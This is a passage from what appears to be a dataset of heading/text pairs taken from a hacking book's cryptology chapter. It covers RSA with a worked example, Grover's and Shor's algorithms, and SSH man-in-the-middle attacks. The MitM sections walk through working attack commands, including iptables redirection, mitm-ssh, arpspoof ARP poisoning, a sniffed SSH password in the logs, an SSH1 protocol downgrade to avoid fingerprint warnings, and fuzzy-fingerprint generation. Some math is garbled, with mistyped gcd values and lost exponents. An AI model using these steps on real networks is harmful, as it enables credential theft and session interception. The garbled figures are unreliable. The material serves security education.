all the keys at the same time. The tricky part\nis getting the right value out of the superposition. Quantum computers are\nweird in that when the superposition is looked at, the whole thing decoheres\ninto a single state. Unfortunately, this decoherence is initially random, and\nthe odds of decohering into each state in the superposition are equal.\nCryptology 399"
  },
  {
    "input": "0x741 RSA",
    "output": "Without some way to manipulate the odds of the superposition states,\nthe same effect could be achieved by just guessing keys. Fortuitously, a man\nnamed Lov Grover came up with an algorithm that can manipulate the odds\nof the superposition states. This algorithm allows the odds of a certain desired\nstate to increase while the others decrease. This process is repeated several\ntimes until the decohering of the superposition into the desired state is\nnearly guaranteed. This takes about O n steps.\nUsing some basic exponential math skills, you will notice that this just\neffectively halves the key size for an exhaustive brute-force attack. So, for the\nultra paranoid, doubling the key size of a block cipher will make it resistant\nto even the theoretical possibilities of an exhaustive brute-force attack with a\nquantum computer.\n0x740 Asymmetric Encryption\nAsymmetric ciphers use two keys: a public key and a private key. The public\nkey is made public, while the private key is kept private; hence the clever names.\nAny message that is encrypted with the public key can only be decrypted with\nthe private key. This removes the issue of key distribution—public keys are\npublic, and by using the public key, a message can be encrypted for the\ncorresponding private key. Unlike symmetric ciphers, there’s no need for an\nout-of-band communication channel to transmit the secret key. However,\nasymmetric ciphers tend to be quite a bit slower than symmetric ciphers.\n0x741 RSA\nRSA is one of the more popular asymmetric algorithms. The security of RSA\nis based on the difficulty of factoring large numbers. First, two prime numbers\nare chosen, P and Q, and their product, N, is computed:\nN = P · Q\nThen, the number of numbers between 1 and N − 1 that are relatively\nprime to N must be calculated (two numbers are relatively prime if their greatest\ncommon divisor is 1). This is known as Euler’s totient function, and it is usually\ndenoted by the lowercase Greek letter phi (φ).\nFor example, φ(9) = 6, since 1, 2, 4, 5, 7, and 8 are relatively prime to 9.\nItshould be easy to notice that if N is prime, φ(N) will be N − 1. A somewhat\nless obvious fact is that if N is the product of exactly two prime numbers, P\nand Q, then φ(P · Q) = (P − 1) · (Q − 1). This comes in handy, since φ(N)\nmust be calculated for RSA.\nAn encryption key, E, that is relatively prime to φ(N), must be chosen\natrandom. Then a decryption key must be found that satisfies the following\nequation, where S is any integer:\nE · D = S · φ(N) + 1\nThis can be solved with the extended Euclidean algorithm. The Euclidean\nalgorithm is a very old algorithm that happens to be a very fast way to calculate\n400 0x700\nthe greatest common divisor (GCD) of two numbers. The larger of the two\nnumbers is divided by the smaller number, paying attention only to the\nremainder. Then, the smaller number is divided by the remainder, and\ntheprocess is repeated until the remainder is zero. The last value for the\nremainder before it reaches zero is the greatest common divisor of the two\noriginal numbers. This algorithm is quite fast, with a run time of O(log N).\n10\nThat means that it should take about as many steps to find the answer as\nthe number of digits in the larger number.\nIn the table below, the GCD of 7253 and 120, written as gcd(7253, 120),\nwill be calculated. The table starts by putting the two numbers in the columns\nA andB, with the larger number in column A. Then A is divided by B, and\nthe remainder is put in column R. On the next line, the old B becomes the\nnew A, and the old R becomes the new B. R is calculated again, and this\nprocess is repeated until the remainder is zero. The last value of R before\nzero is the greatest common divisor.\ngcd(7253, 120)\nA B R\n7253 120 53\n120 53 14\n53 14 11\n14 11 3\n11 3 2\n3 2 1\n2 1 0\nSo, the greatest common divisor of 7243 and 120 is 1. That means that\n7250 and 120 are relatively prime to each other.\nThe extended Euclidean algorithm deals with finding two integers, J and K,\nsuch that\nJ · A + K · B = R\nwhen gcd(A, B) = R.\nThis is done by working the Euclidean algorithm backward. In this case,\nthough, the quotients are important. Here is the math from the prior\nexample, with the quotients:\n7253 = 60 · 120 + 53\n120 = 2 · 53 + 14\n53 = 3 · 14 + 11\n14 = 1 · 11 + 3\n11 = 3 · 3 + 2\n3 = 1 · 2 + 1\nCryptology 401\nWith a little bit of basic algebra, the terms can be moved around for each\nline so the remainder (shown in bold) is by itself on the left of the equal sign:\n53 = 7253 − 60 · 120\n14 = 120 − 2 · 53\n11 = 53− 3 · 14\n3 = 14 − 1 · 11\n2 = 11 − 3 · 3\n1 = 3 − 1 · 2\nStarting from the bottom, it’s clear that:\n1 = 3− 1 · 2\nThe line above that, though, is 2 = 11 − 3 · 3, which gives a substitution\nfor 2:\n1 = 3− 1 · (11 − 3 · 3)\n1 = 4 · 3 − 1 · 11\nThe line above that shows that 3 = 14 − 1 · 11, which can also be\nsubstituted in for 3:\n1 = 4 · (14− 1 · 11) − 1 · 11\n1 = 4 · 14− 5 · 11\nOf course, the line above that shows that 11 = 53 − 3 · 14, prompting\nanother substitution:\n1 = 4 · 14− 5 · (53 − 3 · 14)\n1 = 19 · 14 − 5 · 53\nFollowing the pattern, we use the line that shows 14 = 120 − 2 · 53,\nresulting in another substitution:\n1 = 19 · (120 − 2 · 53) − 5 · 53\n1 = 19 · 120 − 43 · 53\nAnd finally, the top line shows that 53 = 7253 − 60 · 120, for a final\nsubstitution:\n1 = 19 · 120 − 43 · (7253 − 60 · 120)\n1 = 2599 · 120 − 43 · 7253\n2599 · 120 + −43 · 7253 = 1\nThis shows that J and K would be 2599 and −43, respectively.\n402 0x700\nThe numbers in the previous example were chosen for their relevance to\nRSA. Assuming the values for P and Q are 11 and 13, N would be 143. There-\nfore, φ(N) = 120 = (11 − 1) · (13 − 1). Since 7253 is relatively prime to 120,\nthat number makes an excellent value for E.\nIf you recall, the goal was to find a value for D that satisfies the following\nequation:\nE · D = S · φ(N) + 1\nSome basic algebra puts it in a more familiar form:\nD · E + S · φ(N) = 1\nD · 7253 ± S · 120 = 1\nUsing the values from the extended Euclidean algorithm, it’s apparent\nthat D = −43. The value for S doesn’t really matter, which means this math\nisdone modulo φ(N), or modulo 120. That, in turn, means that a positive\nequivalent value for D is 77, since 120 − 43 = 77. This can be put into the\nprior equation from above:\nE · D = S · φ(N) + 1\n7253 · 77 = 4654 · 120 + 1\nThe values for N and E are distributed as the public key, while D is\nkeptsecret as the private key. P and Q are discarded. The encryption and\ndecryption functions are fairly simple.\nEncryption: C = ME(modN)\nDecryption: M = CD(modN)\nFor example, if the message, M, is 98, encryption would be as follows:\n987253 = 76(mod143)\nThe ciphertext would be 76. Then, only someone who knew the value for\nD could decrypt the message and recover the number 98 from the number 76,\nas follows:\n7677 = 98(mod143)\nObviously, if the message, M, is larger than N, it must be broken down\ninto chunks that are smaller than N.\nThis process is made possible by Euler’s totient theorem. It states that\nifM and N are relatively prime, with M being the smaller number, then\nwhen M is multiplied by itself φ(N) times and divided by N, the remainder\nwill always be 1:\nIf gcd(M, N) = 1 and M < N then Mφ(N) = 1(modN)\nCryptology 403"
  },
  {
    "input": "0x742 Peter Shor’s Quantum Factoring Algorithm",
    "output": "Since this is all done modulo N, the following is also true, due to the way\nmultiplication works in modulus arithmetic:\nMφ(N) · Mφ(N) = 1 · 1(modN)\nM2 · φ(N) = 1(modN)\nThis process could be repeated again and again S times to produce this:\nMS · φ(N) = 1(modN)\nIf both sides are multiplied by M, the result is:\nMS · φ(N) · M = 1 · M(modN)\nMS · φ(N) + 1 = M(modN)\nThis equation is basically the core of RSA. A number, M, raised to a power\nmodulo N, produces the original number M again. This is basically a function\nthat returns its own input, which isn’t all that interesting by itself. But if this\nequation could be broken up into two separate parts, then one part could be\nused to encrypt and the other to decrypt, producing the original message\nagain. This can be done by finding two numbers, E and D, that multiplied\ntogether equal S times φ(N) plus 1. Then this value can be substituted into\nthe previous equation:\nE · D = S · φ(N) + 1\nME · D = M(modN)\nThis is equivalent to:\nM\nED\n= M(modN)\nwhich can be broken up into two steps:\nME = C(modN)\nCD = M(modN)\nAnd that’s basically RSA. The security of the algorithm is tied to keeping\nD secret. But since N and E are both public values, if N can be factored into\nthe original P and Q, then φ(N) can easily be calculated with (P − 1) · (Q − 1),\nand then D can be determined with the extended Euclidean algorithm. There-\nfore, the key sizes for RSA must be chosen with the best-known factoring\nalgorithm in mind to maintain computational security. Currently, the best-\nknown factoring algorithm for large numbers is the number field sieve (NFS).\nThis algorithm has a subexponential run time, which is pretty good, but still\nnot fast enough to crack a 2,048-bit RSA key in a reasonable amount of time.\n0x742 Peter Shor’s Quantum Factoring Algorithm\nOnce again, quantum computation promises amazing increases in computa-\ntion potential. Peter Shor was able to take advantage of the massive parallelism\nof quantum computers to efficiently factor numbers using an old number-\ntheory trick.\n404 0x700\nThe algorithm is actually quite simple. Take a number, N, to factor.\nChoose a value, A, that is less than N. This value should also be relatively\nprime to N, but assuming that N is the product of two prime numbers\n(which will always be the case when trying to factor numbers to break RSA),\nif A isn’t relatively prime to N, then A is one of N’s factors.\nNext, load up the superposition with sequential numbers counting\nupfrom 1 and feed every one of those values through the function\nf(x)=Ax(modN). This is all done at the same time, through the magic\nofquantum computation. A repeating pattern will emerge in the results,\nand the period of this repetition must be found. Luckily, this can be done\nquickly on a quantum computer with a Fourier transform. This period will\nbe called R.\nThen, simply calculate gcd(AR/2 + 1, N) and gcd(AR/2 − 1, N). At least one\nof these values should be a factor of N. This is possible because AR=1(modN)\nand is further explained below.\nAR = 1(modN)\n(AR/2)2 = 1(modN)\n(AR/2)2 − 1 = 0(modN)\n(AR/2 − 1) · (AR/2 + 1) = 0(modN)\nThis means that (AR/2 − 1) · (AR/2 + 1) is an integer multiple of N. As\nlong as these values don’t zero themselves out, one of them will have a factor\nin common with N.\nTo crack the previous RSA example, the public value N must be factored.\nIn this case N equals 143. Next, a value for A is chosen that is relatively prime to\nand less than N, so A equals 21. The function will look like f(x)=21x(mod143).\nEvery sequential value from 1 up to as high as the quantum computer will\nallow will be put through this function.\nTo keep this brief, the assumption will be that the quantum computer\nhas three quantum bits, so the superposition can hold eight values.\nx = 1 211(mod143) = 21\nx = 2 212(mod143) = 12\nx = 3 213(mod143) = 109\nx = 4 214(mod143) = 1\nx = 5 215(mod143) = 21\nx = 6 216(mod143) = 12\nx = 7 217(mod143) = 109\nx = 8 218(mod143) = 1\nHere the period is easy to determine by eye: R is 4. Armed with this\ninformation, gcd(212 − 1143) and gcd(212 + 1143) should produce at\nleastoneof the factors. This time, both factors actually appear, since\ngcd(440, 143) = 11 and gcd(442, 142) = 13. These factors can then be\nusedto recalculate the private key for the previous RSA example.\nCryptology 405"
  },
  {
    "input": "0x751 Man-in-the-Middle Attacks",
    "output": "0x750 Hybrid Ciphers\nA hybrid cryptosystem gets the best of both worlds. An asymmetric cipher\nisused to exchange a randomly generated key that is used to encrypt the\nremaining communications with a symmetric cipher. This provides the\nspeed and efficiency of a symmetric cipher, while solving the dilemma of\nsecure key exchange. Hybrid ciphers are used by most modern cryptographic\napplications, such as SSL, SSH, and PGP.\nSince most applications use ciphers that are resistant to cryptanalysis,\nattacking the cipher usually won’t work. However, if an attacker can inter-\ncept communications between both parties and masquerade as one or the\nother, the key exchange algorithm can be attacked.\n0x751 Man-in-the-Middle Attacks\nA man-in-the-middle (MitM) attack is a clever way to circumvent encryption.\nThe attacker sits between the two communicating parties, with each party\nbelieving they are communicating with the other party, but both are com-\nmunicating with the attacker.\nWhen an encrypted connection between the two parties is established, a\nsecret key is generated and transmitted using an asymmetric cipher. Usually,\nthis key is used to encrypt further communication between the two parties.\nSince the key is securely transmitted and the subsequent traffic is secured by\nthe key, all of this traffic is unreadable by any would-be attacker sniffing these\npackets.\nHowever, in an MitM attack, party A believes that she is communicating\nwith B, and party B believes he is communicating with A, but in reality, both\nare communicating with the attacker. So, when A negotiates an encrypted\nconnection with B, A is actually opening an encrypted connection with the\nattacker, which means the attacker securely communicates with an asymmetric\ncipher and learns the secret key. Then the attacker just needs to open another\nencrypted connection with B, and B will believe that he is communicating\nwith A, as shown in the following illustration.\nEncrypted\nCommunication\nwith Key 1\nAttacker System A\nAppears to\nbe System B\nAppears to\nbe System A\nEncrypted Systems A and B both believe\nCommunication they are communicating with\nwith Key 2\neach other.\nSystem B\n406 0x700\nThis means that the attacker actually maintains two separate encrypted\ncommunication channels with two separate encryption keys. Packets from A\nare encrypted with the first key and sent to the attacker, which A believes is\nactually B. The attacker then decrypts these packets with the first key and\nre-encrypts them with the second key. Then the attacker sends the newly\nencrypted packets to B, and B believes these packets are actually being sent\nby A. By sitting in the middle and maintaining two separate keys, the attacker\nis able to sniff and even modify traffic between A and B without either side\nbeing the wiser.\nAfter redirecting traffic using an ARP cache poisoning tool, there are a\nnumber of SSH man-in-the-middle attack tools that can be used. Most of\nthese are just modifications to the existing openssh source code. One notable\nexample is the aptly named mitm-ssh package, by Claes Nyberg, which has\nbeen included on the LiveCD.\nThis can all be done with the ARP redirection technique from “Active\nSniffing” on page 239 and a modified openssh package aptly called mitm-\nssh. There are other tools that do this; however, Claes Nyberg’s mitm-ssh\nispublicly available and the most robust. The source package is on the\nLiveCD in /usr/src/mitm-ssh, and it has already been built and installed.\nWhen running, it accepts connections to a given port and then proxies\nthese connections to the real destination IP address of the target SSH\nserver. With the help of arpspoof to poison ARP caches, traffic to the target\nSSH server can be redirected to the attacker’s machine running mitm-ssh.\nSince this program listens on localhost, some IP filtering rules are needed\ntoredirect the traffic.\nIn the example below, the target SSH server is at 192.168.42.72. When\nmitm-ssh is run, it will listen on port 2222, so it doesn’t need to be run as\nroot. The iptables command tells Linux to redirect all incoming TCP con-\nnections on port 22 to localhost 2222, where mitm-ssh will be listening.\nreader@hacking:~ $ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\nreader@hacking:~ $ sudo iptables -t nat -L\nChain PREROUTING (policy ACCEPT)\ntarget prot opt source destination\nREDIRECT tcp -- anywhere anywhere tcp dpt:ssh redir ports 2222\nChain POSTROUTING (policy ACCEPT)\ntarget prot opt source destination\nChain OUTPUT (policy ACCEPT)\ntarget prot opt source destination\nreader@hacking:~ $ mitm-ssh\n..\n/|\\ SSH Man In The Middle [Based on OpenSSH_3.9p1]\n_|_ By CMN <cmn@darklab.org>\nUsage: mitm-ssh <non-nat-route> [option(s)]\nRoutes:\nCryptology 407\n<host>[:<port>] - Static route to port on host\n(for non NAT connections)\nOptions:\n-v - Verbose output\n-n - Do not attempt to resolve hostnames\n-d - Debug, repeat to increase verbosity\n-p port - Port to listen for connections on\n-f configfile - Configuration file to read\nLog Options:\n-c logdir - Log data from client in directory\n-s logdir - Log data from server in directory\n-o file - Log passwords to file\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key.\nRSA key generation complete.\nThen in another terminal window on the same machine, Dug Song’s\narpspoof tool is used to poison ARP caches and redirect traffic destined for\n192.168.42.72 to our machine, instead.\nreader@hacking:~ $ arpspoof\nVersion: 2.3\nUsage: arpspoof [-i interface] [-t target] host\nreader@hacking:~ $ sudo arpspoof -i eth0 192.168.42.72\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\nAnd now the MitM attack is all set up and ready for the next unsus-\npecting victim. The output below is from another machine on the network\n(192.168.42.250), which makes an SSH connection to 192.168.42.72.\nOn Machine 192.168.42.250 (tetsuo), Connecting to 192.168.42.72 (loki)\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password:\nLast login: Mon Oct 1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\njose@loki:~ $ ls -a\n. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples\njose@loki:~ $ id\nuid=1001(jose) gid=1001(jose) groups=1001(jose)\njose@loki:~ $ exit\nlogout\n408 0x700\nConnection to 192.168.42.72 closed.\niz@tetsuo:~ $\nEverything seems okay, and the connection appeared to be secure.\nHowever, the connection was secretly routed through the attacker’s\nmachine, which used a separate encrypted connection to back to the\ntargetserver. Back on the attacker’s machine, everything about the\nconnection has been logged.\nOn the Attacker’s Machine\nreader@hacking:~ $ sudo mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key.\nRSA key generation complete.\nWARNING: /usr/local/etc/moduli does not exist, using fixed modulus\n[MITM] Found real target 192.168.42.72:22 for NAT host 192.168.42.250:1929\n[MITM] Routing SSH2 192.168.42.250:1929 -> 192.168.42.72:22\n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\n[MITM] Connection from UNKNOWN:1929 closed\nreader@hacking:~ $ ls /usr/local/var/log/mitm-ssh/\npasswd.log\nssh2 192.168.42.250:1929 <- 192.168.42.72:22\nssh2 192.168.42.250:1929 -> 192.168.42.72:22\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/passwd.log\n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/ssh2*\nLast login: Mon Oct 1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\njose@loki:~ $ ls -a\n. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples\njose@loki:~ $ id\nuid=1001(jose) gid=1001(jose) groups=1001(jose)\njose@loki:~ $ exit\nlogout\nSince the authentication was actually redirected, with the attacker’s\nmachine acting as a proxy, the password sP#byp%srt could be sniffed. In\naddition, the data transmitted during the connection is captured, showing\nthe attacker everything the victim did during the SSH session.\nThe attacker’s ability to masquerade as either party is what makes this\ntype of attack possible. SSL and SSH were designed with this in mind and\nhave protections against identity spoofing. SSL uses certificates to validate\nidentity, and SSH uses host fingerprints. If the attacker doesn’t have the\nproper certificate or fingerprint for B when A attempts to open an encrypted\nCryptology 409"
  },
  {
    "input": "0x752 Differing SSH Protocol Host Fingerprints",
    "output": "communication channel with the attacker, the signatures won’t match and A\nwill be alerted with a warning.\nIn the previous example, 192.168.42.250 (tetsuo) had never previously\ncommunicated over SSH with 192.168.42.72 (loki) and therefore didn’t\nhave a host fingerprint. The host fingerprint that it accepted was actually\nthe fingerprint generated by mitm-ssh. If, however, 192.168.42.250 (tetsuo)\nhad a host fingerprint for 192.168.42.72 (loki), the whole attack would\nhave been detected, and the user would have been presented with a very\nblatant warning:\niz@tetsuo:~ $ ssh jose@192.168.42.72\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that the RSA host key has just been changed.\nThe fingerprint for the RSA key sent by the remote host is\n84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.\nPlease contact your system administrator.\nAdd correct host key in /home/jon/.ssh/known_hosts to get rid of this message.\nOffending key in /home/jon/.ssh/known_hosts:1\nRSA host key for 192.168.42.72 has changed and you have requested strict checking.\nHost key verification failed.\niz@tetsuo:~ $\nThe openssh client will actually prevent the user from connecting until\nthe old host fingerprint has been removed. However, many Windows SSH\nclients don’t have the same kind of strict enforcement of these rules and will\npresent the user with an “Are you sure you want to continue?” dialog box.\nAnuninformed user might just click right through the warning.\n0x752 Differing SSH Protocol Host Fingerprints\nSSH host fingerprints do have a few vulnerabilities. These vulnerabilities\nhave been compensated for in the most recent versions of openssh, but they\nstill exist in older implementations.\nUsually, the first time an SSH connection is made to a new host, that host’s\nfingerprint is added to a known_hosts file, as shown here:\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password: <ctrl-c>\niz@tetsuo:~ $ grep 192.168.42.72 ~/.ssh/known_hosts\n192.168.42.72 ssh-rsa\nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\n52KTzjtKGacX4gTLNSc8fzfZU=\niz@tetsuo:~ $\n410 0x700\nHowever, there are two different protocols of SSH—SSH1 and SSH2—\neach with separate host fingerprints.\niz@tetsuo:~ $ rm ~/.ssh/known_hosts\niz@tetsuo:~ $ ssh -1 jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is e7:c4:81:fe:38:bc:a8:03:f9:79:cd:16:e9:8f:43:55.\nAre you sure you want to continue connecting (yes/no)? no\nHost key verification failed.\niz@tetsuo:~ $ ssh -2 jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? no\nHost key verification failed.\niz@tetsuo:~ $\nThe banner presented by the SSH server describes which SSH protocols\nit understands (shown in bold below):\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\nEscape character is '^]'.\nSSH-1.99-OpenSSH_3.9p1\nConnection closed by foreign host.\niz@tetsuo:~ $ telnet 192.168.42.1 22\nTrying 192.168.42.1...\nConnected to 192.168.42.1.\nEscape character is '^]'.\nSSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1\nConnection closed by foreign host.\niz@tetsuo:~ $\nThe banner from 192.168.42.72 (loki) includes the string SSH-1.99, which,\nby convention, means that the server speaks both protocols 1 and 2. Often, the\nSSH server will be configured with a line like Protocol 2,1, which also means\nthe server speaks both protocols and tries to use SSH2 if possible. This is to\nretain backward compatibility, so SSH1-only clients can still connect.\nIn contrast, the banner from 192.168.42.1 includes the string SSH-2.0,\nwhich shows that the server only speaks protocol 2. In this case, it’s obvious\nthat any clients connecting to it have only communicated with SSH2 and\ntherefore only have host fingerprints for protocol 2.\nThe same is true for loki (192.168.42.72); however, loki also accepts SSH1,\nwhich has a different set of host fingerprints. It’s unlikely that a client will\nhave used SSH1, and therefore doesn’t have the host fingerprints for this\nprotocol yet.\nIf the modified SSH daemon being used for the MitM attack forces the\nclient to communicate using the other protocol, no host fingerprint will be\nfound. Instead of being presented with a lengthy warning, the user will simply\nCryptology 411\nbe asked to add the new fingerprint. The mitm-sshtool uses a configuration\nfile similar to openssh’s, since it’s built from that code. By adding the line\nProtocol 1 to /usr/local/etc/mitm-ssh_config, the mitm-ssh daemon will\nclaim it only speaks the SSH1 protocol.\nThe output below shows that loki’s SSH server usually speaks using both\nSSH1 and SSH2 protocols, but when mitm-ssh is put in the middle using the\nnew configuration file, the fake server claims it only speaks SSH1 protocol.\nFrom 192.168.42.250 (tetsuo), Just an Innocent Machine on the Network\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\nEscape character is '^]'.\nSSH-1.99-OpenSSH_3.9p1\nConnection closed by foreign host.\niz@tetsuo:~ $ rm ~/.ssh/known_hosts\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password:\niz@tetsuo:~ $\nOn the Attacker’s Machine, Setting Up mitm-ssh to Only Use SSH1 Protocol\nreader@hacking:~ $ echo \"Protocol 1\" >> /usr/local/etc/mitm-ssh_config\nreader@hacking:~ $ tail /usr/local/etc/mitm-ssh_config\n# Where to store passwords\n#PasswdLogFile /var/log/mitm-ssh/passwd.log\n# Where to store data sent from client to server\n#ClientToServerLogDir /var/log/mitm-ssh\n# Where to store data sent from server to client\n#ServerToClientLogDir /var/log/mitm-ssh\nProtocol 1\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key.\nRSA key generation complete.\nNow Back on 192.168.42.250 (tetsuo)\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\n412 0x700"
  },
  {
    "input": "0x753 Fuzzy Fingerprints",
    "output": "Escape character is '^]'.\nSSH-1.5-OpenSSH_3.9p1\nConnection closed by foreign host.\nUsually, clients such as tetsuo connecting to loki at 192.168.42.72 would\nhave only communicated using SSH2. Therefore, there would only be a host\nfingerprint for SSH protocol 2 stored on the client. When protocol 1 is forced\nby the MitM attack, the attacker’s fingerprint won’t be compared to the stored\nfingerprint, due to the differing protocols. Older implementations will simply\nask to add this fingerprint since, technically, no host fingerprint exists for\nthis protocol. This is shown in the output below.\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6.\nAre you sure you want to continue connecting (yes/no)?\nSince this vulnerability was made public, newer implementations of\nOpenSSH have a slightly more verbose warning:\niz@tetsuo:~ $ ssh jose@192.168.42.72\nWARNING: RSA key found for host 192.168.42.72\nin /home/iz/.ssh/known_hosts:1\nRSA key fingerprint ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established\nbut keys of different type are already known for this host.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6.\nAre you sure you want to continue connecting (yes/no)?\nThis modified warning isn’t as strong as the warning given when host\nfingerprints of the same protocol don’t match. Also, since not all clients will\nbe up to date, this technique can still prove to be useful for an MitM attack.\n0x753 Fuzzy Fingerprints\nKonrad Rieck had an interesting idea regarding SSH host fingerprints. Often,\na user will connect to a server from several different clients. The host finger-\nprint will be displayed and added each time a new client is used, and a security-\nconscious user will tend to remember the general structure of the host\nfingerprint. While no one actually memorizes the entire fingerprint, major\nchanges can be detected with little effort. Having a general idea of what the\nhost fingerprint looks like when connecting from a new client greatly increases\nthe security of that connection. If an MitM attack is attempted, the blatant\ndifference in host fingerprints can usually be detected by eye.\nHowever, the eye and the brain can be tricked. Certain fingerprints will\nlook very similar to others. Digits 1 and 7 look very similar, depending on the\ndisplay font. Usually, the hex digits found at the beginning and end of the\nfingerprint are remembered with the greatest clarity, while the middle tends\nCryptology 413\nto be a bit hazy. The goal behind the fuzzy fingerprint technique is to generate\na host key with a fingerprint that looks similar enough to the original finger-\nprint to fool the human eye.\nThe openssh package provides tools to retrieve the host key from servers.\nreader@hacking:~ $ ssh-keyscan -t rsa 192.168.42.72 > loki.hostkey\n# 192.168.42.72 SSH-1.99-OpenSSH_3.9p1\nreader@hacking:~ $ cat loki.hostkey\n192.168.42.72 ssh-rsa\nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\n52KTzjtKGacX4gTLNSc8fzfZU=\nreader@hacking:~ $ ssh-keygen -l -f loki.hostkey\n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72\nreader@hacking:~ $\nNow that the host key fingerprint format is known for 192.168.42.72\n(loki), fuzzy fingerprints can be generated that look similar. A program that\ndoes this has been developed by Rieck and is available at http://www.thc\n.org/thc-ffp/. The following output shows the creation of some fuzzy finger-\nprints for 192.168.42.72 (loki).\nreader@hacking:~ $ ffp\nUsage: ffp [Options]\nOptions:\n-f type Specify type of fingerprint to use [Default: md5]\nAvailable: md5, sha1, ripemd\n-t hash Target fingerprint in byte blocks.\nColon-separated: 01:23:45:67... or as string 01234567...\n-k type Specify type of key to calculate [Default: rsa]\nAvailable: rsa, dsa\n-b bits Number of bits in the keys to calculate [Default: 1024]\n-K mode Specify key calulation mode [Default: sloppy]\nAvailable: sloppy, accurate\n-m type Specify type of fuzzy map to use [Default: gauss]\nAvailable: gauss, cosine\n-v variation Variation to use for fuzzy map generation [Default: 7.3]\n-y mean Mean value to use for fuzzy map generation [Default: 0.14]\n-l size Size of list that contains best fingerprints [Default: 10]\n-s filename Filename of the state file [Default: /var/tmp/ffp.state]\n-e Extract SSH host key pairs from state file\n-d directory Directory to store generated ssh keys to [Default: /tmp]\n-p period Period to save state file and display state [Default: 60]\n-V Display 